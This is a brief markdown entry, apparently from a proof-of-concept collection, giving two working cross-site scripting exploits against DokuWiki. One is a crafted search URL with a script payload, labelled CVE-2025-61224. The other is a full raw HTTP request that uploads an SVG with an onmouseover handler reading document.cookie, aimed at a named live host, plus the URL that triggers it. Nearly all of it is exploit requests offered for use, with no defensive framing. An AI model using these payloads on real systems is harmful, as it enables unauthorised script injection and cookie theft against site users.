# DokuWiki

### CVE-2025-61224
- ***poc:***  *GET https://<host>/dokuwiki/doku.php?id=start&do=search&q=1%20%40%3Cscript%3Eprompt%60xss%60%3C%2fscript%3E*
- ***Payload:*** ```1 @<script>prompt`xss`</script>```

### 2024-02-06a
- ***poc:***
```
POST /lib/exe/ajax.php?tab_files=files&tab_details=view&do=media&ns=&sectok=&mediaid=&call=mediaupload&qqfile=alert.svg&ow=false HTTP/2
Host: manual.kcell.kz
Content-Length: 197
X-Requested-With: XMLHttpRequest
X-File-Name: alert.svg
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.289 Safari/537.36
Content-Type: application/octet-stream
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close

<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <circle r="50" cx="50" cy="50" fill="red" 
            onmouseover="alert(document.cookie);" />
</svg>

```
- ***execute:*** ```http://your-ip/data/media/alert.svg```
